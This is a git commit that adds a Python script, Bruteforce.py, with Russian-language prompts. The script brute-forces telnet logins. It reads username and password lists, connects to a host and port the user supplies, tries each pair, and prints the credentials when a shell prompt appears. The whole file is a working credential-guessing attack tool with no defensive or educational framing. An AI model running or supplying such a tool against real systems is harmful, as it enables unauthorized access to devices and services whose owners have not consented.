8958ecc2f149b799920f08dfe68b1fb7b07c7903
AlexeyCamacho <56472111+AlexeyCamacho@users.noreply.github.com>
2022-12-27 21:50:29 +0400

    Add files via upload

---
+++ Bruteforce.py
@@ -0,0 +1,50 @@
+import telnetlib
+import re
+import time
+
+faled = "Invalid Login."
+
+usersPath = input("Введите путь к файлу с логинами: ")
+passwordsPath = input("Введите путь к файлу с паролями: ")
+host = input("Введите хост: ")
+port = input("Введите порт: ")
+faled_ = input("Введите текст неудачи (по умолчанию = Invalid Login.): ")
+
+if faled_:
+    faled = faled_
+
+usersFile = open(usersPath,'r')
+passwordsFile = open(passwordsPath,'r')
+
+logins = []
+passwords = []
+
+logins_ = usersFile.readlines()
+for login in logins_:
+    logins.append(login.strip())
+usersFile.close
+
+paswords_ = passwordsFile.readlines()
+for password in paswords_:
+    passwords.append(password.strip())
+passwordsFile.close
+
+
+for i in range(len(logins)):
+    tn = telnetlib.Telnet(host, port)
+
+    tn.read_until(b"Username")
+    tn.write(logins[i].encode('ascii') + b"\n")
+    tn.read_until(b"Password")
+    tn.write(passwords[i].encode('ascii') + b"\n")
+
+    regex_idx, match, output = tn.expect([faled.encode('utf-8'), b"#"])
+
+    if (regex_idx == 0):
+        time.sleep(3)
+        continue
+    else:
+        print("Пароль подобран")
+        print("Login: ", logins[i], " Password: ", passwords[i])
+        break
+ 
